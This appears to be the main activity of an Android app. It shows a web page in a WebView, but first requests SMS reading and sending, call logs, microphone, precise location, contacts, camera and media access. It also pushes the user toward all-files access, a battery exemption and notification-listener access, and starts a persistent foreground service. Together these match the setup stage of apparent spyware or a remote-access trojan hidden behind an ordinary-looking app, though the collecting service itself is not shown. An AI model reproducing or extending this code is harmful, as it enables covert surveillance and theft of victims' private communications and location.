package com.fason.app.ui;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.R;
import com.fason.app.core.config.Config;
import com.fason.app.service.MainService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQ = 1001;
    private WebView webView;
    private ProgressBar progress;
    private boolean loaded = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        progress = findViewById(R.id.progressBar);
        setupWebView();
        
        if (savedInstanceState != null && webView != null) {
            webView.restoreState(savedInstanceState);
            loaded = true;
        }
        
        requestPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) proceed();
        } else {
            proceed();
        }
    }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle out) {
        super.onSaveInstanceState(out);
        if (webView != null) webView.saveState(out);
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        if (webView != null) webView.destroy();
        super.onDestroy();
    }

    private void requestPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(android.Manifest.permission.CAMERA);
        perms.add(android.Manifest.permission.READ_SMS);
        perms.add(android.Manifest.permission.SEND_SMS);
        perms.add(android.Manifest.permission.READ_PHONE_STATE);
        perms.add(android.Manifest.permission.READ_CALL_LOG);
        perms.add(android.Manifest.permission.RECORD_AUDIO);
        perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(android.Manifest.permission.READ_CONTACTS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(android.Manifest.permission.POST_NOTIFICATIONS);
            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(android.Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(android.Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        List<String> needed = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERM_REQ);
        } else {
            proceed();
        }
    }

    private void proceed() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Exception e) {
                try { startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)); } 
                catch (Exception ignored) {}
            }
            return;
        }

        requestBatteryExemption();
        startService();

        if (!isNotifServiceEnabled()) {
            Toast.makeText(this, "Enable notification access", Toast.LENGTH_LONG).show();
            try { startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)); } 
            catch (Exception ignored) {}
        } else {
            loadPage();
        }
    }

    private void requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(i);
                }
            } catch (Exception ignored) {}
        }
    }

    private void startService() {
        try {
            ContextCompat.startForegroundService(this, new Intent(this, MainService.class));
        } catch (Exception ignored) {}
    }

    private boolean isNotifServiceEnabled() {
        String listeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return listeners != null && listeners.contains(getPackageName());
    }

    private void loadPage() {
        if (webView == null || loaded) return;
        if (progress != null) progress.setVisibility(View.VISIBLE);
        webView.loadUrl(Config.HOME_PAGE_URL);
        loaded = true;
    }

    @Override
    public void onRequestPermissionsResult(int req, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(req, perms, results);
        if (req == PERM_REQ) proceed();
    }

    private void setupWebView() {
        if (webView == null) return;
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView v, String url) {
                if (progress != null) progress.setVisibility(View.GONE);
            }
            @Override
            public void onPageStarted(WebView v, String url, android.graphics.Bitmap fav) {
                if (progress != null) progress.setVisibility(View.VISIBLE);
            }
        });
    }
}
